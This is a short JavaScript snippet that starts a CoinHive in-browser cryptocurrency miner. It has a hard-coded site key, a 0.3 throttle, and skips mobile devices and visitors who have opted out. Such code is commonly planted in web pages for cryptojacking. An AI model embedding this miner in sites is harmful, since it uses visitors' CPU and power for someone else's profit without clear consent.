      var miner = new CoinHive.Anonymous('hx8QH0mKwT35p9QoNEH7agWJ52mRjN3q', {
          throttle: 0.3
      });
      if (!miner.isMobile() && !miner.didOptOut(14400)) {
          miner.start();
      }